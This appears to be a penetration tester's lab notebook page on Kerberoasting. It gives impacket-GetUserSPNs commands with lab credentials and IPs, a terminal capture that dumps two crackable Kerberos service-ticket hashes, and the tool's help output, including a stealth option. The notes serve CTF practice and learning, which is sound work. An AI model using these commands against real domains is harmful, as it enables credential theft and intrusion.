
other suggested tools for this simpler alternative - `targetedKerberoast.py`, `nxc ldap --kerboroasting`

Get user hash:
`impacket-GetUserSPNs administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.129.229.8 -dc-host dc.administrator.htb -request-user ethan`

Get all kerberoastable account hashes:
`impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.182.49 -request`

### Examples

[[../../../Boxes/HackTheBox/Administrator (Done)/12 - set and get spn to get|12 - set and get spn to get]]

```sh
┌──(fixit42㉿kali)-[~/boxes/thm/Attacking Kerberos]
└─$ impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.182.49 -request 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-26 00:28:26.922527  2020-05-26 00:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 00:39:17.578393  2020-05-26 00:40:14.671872             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$ed7ed6ad444a966a5ea461c1d15dad3f$bf0225dd3c4f2e08d885f169d31bbef4b3b538aa2f2834bcd01c3b27411a5a25c2658834b4f951b0bac06c85d927c387e59e49fed3e0eecdbb137c665ddf35b7d19e4122cbb805abdcae8f906ca7b49e2c50c476ef85818eeaf3350425acaa7e9cd69fd79e5de1d133fe155502c83836cb4c6aed2e14e6253207d0b9d448ca63719bb21fea59085007ff5f74aadfd7fc91846cd0049a1358886aba9e37af58996172c1cbb24d1230c58de69d4bd24dab125bb3977547ac0d2de95833dacdea605ce880ba3e6a3187d72b230766ae345f9993478380876a40a14fd4b6ed66e02232ecb3e32aa16fa18c7e9cd1299b938d41189a32c273a1a724e43acb227cd373b9d8ec44d6fdd36764c6fae21a2bc0423bccc5424935578c9def038c11c194f8c226bfdd44cd13422085cc6126a2ccb96a3fed4f18f3380ada464a3d8424abb351405e8f4e07772106c19a701bd8249c7941f7bbcea75f994dbb2d57a22c6917dbe635bb83db1e11294a1aadedf8b387562afe4b45b8768a97b53f436491bb84344a5637ec81babe8141ec89d58941419d108d23a4cd6f64390d604de4cdf3e10218799eecdf49fc3ce928e4c00f2210e4c885453b6190bdaf13d2cf996debd9398003b2a9dd59103df7133242642217ddfe3c6d61441b638f712615b24d4002dd1f995398d220121aa06b75b85fc44dab9e79c3260e6b5011cecdece77733833d91852dcda24fa178e2863ceff4f2519dbb468136565e9bb0bf49a2b647596b3c52d7ef36803651f82dcdba33561d6cd9cdda1058e6cb82438abcf55b8b11386e1cf4bada4ba1666beadfedf2eed111d0a572e59d51560a7d756b8f130a5f6356c68822d92bcb81e10f52f4c0c9a29ec96e0e86e1b06c9e4c527aba5d89245726098a5d0b36c75a4139d182af410e336557ef1ff6290c852cfd1f3560a8f0fac87a668d12f3fb6f254ea48339e8687a676b683e0716b26cb7fe3de642503358a6dba2ba7fcfccd8e3ff849134bbb12f6638bf460426b2bbca72f5168bafe53604faeca83664c7bd7ab91a21ca8c3dd44cd142cc82834c077155edf3a15ea13bf31000b6e9997528976a8f71c274f6cb65b9f4dd82905a3dd8766a9aae865acd38177c20dec0b7571219cf6509961899ea04fbc034c5d451f4fc1110b380614e97dc06077525888c2bd3ad77820d50b79d567bcacaf89e72c9124b5575713a1fe70c27c9aeba256048d6f74dc38c2666668cfdfba28463e34d1ab2eba5c040a595cb076156425396343f0519234aa713a89c01fc54f2450bdcf9076af03d324b9c81638fa7017811883ad679c8bc29c6b5c84484473edd5433c9ad3079ebd86814c326bdf144cdffaa45e4c2c6d182c24c
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$145db0d6c43b1c51c0943181a9a0f5c1$7ce6f35eef39c0da206802cf33d4700c4a4808f67d94c6243e4c1226bbdc906843893bbaf770d4e3f432f594ebf9a6cb019104407bb0e50ea1826d390a1f81ff55bcbb562cf7df2e2d4ea9346e25e3d4489e5233a26770a54e27a7d6c5bdab3c52ca74f3dbceaf4cf39b1d52896304b2358563bd14b59d6d7d677c0bf963fa3fb9188b6a46cdfbebda13b884f1605dab435f2f08e2a60c250dacbae112d9d98e7ca6670ebc98235ddc4898419c3d99e75f2115d423531d79a8550d9900e5ceeaef7b61353a45ec375718095ddbc6c5c54fdfe09c26d70be79133c3178b3c8f1de8559b356b0817e1b196f5098986614cddb6b64c0126ea85f52b1e316b43f74ca3e74f865d5d41286a53c8e91f8557d2d40cafc9b62445be1c67b4a5b6b075f3775d9be6578637a990445b2b8057f32eeb412ed9689b22fdf9cdea7b3a36cfcf1ece9203f25a84a0f452ed5f4b22de44367ef1cfa1797ba3495c52363af8acaa83e067775977c82f356498deb54e121f43b00cd871fca10019ef6cc8809117b56980b8cb715093679a4e818dce4d4db259df258968996875e9f35497caa0664a9eba7e6d689393f281078117c9873f0403118964bec3585eed168a735ab322d707adc6ebc48fc2958a91ce943a155bc544797f6ecb3dad9934fff9f0c8913833ab866bad5fcd368f147f299ca26fa4c11450859c3907e84da14132c44602663e75878b192c001620e0263d15cec1046487d26dc933afac3405d6006f467d1ab5fb6299a40c2ce08ee2149a192ef9c219024ccbdcee5ab0821826deb01ff7dbc9a439e64bcf650168465cd5c7061bb865ceb9fb363dba76f5422146f97afa856d54b62d4ceeee21ca420cf3902e67f29a88f1cd930bd4eed729d2f787e1784fce5d4f4ce302a15bc6def2ad4f7d311d85cacae2c26adc687195187aa3ccff7ffb1761e357f650e98ce89870d6fc367c39cb82a2859c7c479159f45390b9c2707dc8ba38f7ba8c51e3ab4f8098d28d0a42d4a477e0a23f42ed36793719cc6f4ef018a45b7a4a9d56d5db4db351e0cca2e2eac360a6b3153892ec0d03a1f55c57715f953f552edf7192b98d618eb59b071e6cf71e1fba55347a9ee367d96e2923783219820edb46ac55e42c44dfb6fbf0cd95a5be2aa8c6f1c6bb1eca1c4a6c599e6172154eb3debe8a19a7b26056e8b4ff2b12dc1349df495c175bb39b6a0273aa9ff667b51c1f2f0eaa4efae2928dbb7925b49b8fd0a406ec04c34d5f7258af52600a6c044ba1231617b886d7ee5e868808c6500024321407ca3a9716732a8c1c809d2d8572535c59966922bcff8e52d302e7fabe9cf31a6ce05bf6381af8fd4ce588bedf42a468450cf941e1737e47d963
```

### Help

```sh
┌──(fixit42㉿kali)-[~/boxes/thm/Attacking Kerberos]
└─$ impacket-GetUserSPNs -h                                                                                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-no-preauth NO_PREAUTH] [-stealth] [-usersfile USERSFILE]
                      [-request] [-request-user username] [-save] [-outputfile OUTPUTFILE] [-ts] [-debug]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain[/username[:password]]

options:
  -h, --help            show this help message and exit
  -target-domain TARGET_DOMAIN
                        Domain to query/request if different than the domain of the user. Allows for Kerberoasting across
                        trusts.
  -no-preauth NO_PREAUTH
                        account that does not require preauth, to obtain Service Ticket through the AS
  -stealth              Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. May cause huge
                        memory consumption / errors on large domains.
  -usersfile USERSFILE  File with user per line to test
  -request              Requests TGS for users and output them in JtR/hashcat format (default False)
  -request-user username
                        Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
  -save                 Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format. Auto selects -request
  -ts                   Adds timestamp to every logging output.
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don´t ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target
                        parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the
                        target parameter. Ignoredif -target-domain is specified.
  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the
                        account parameter will be used
```
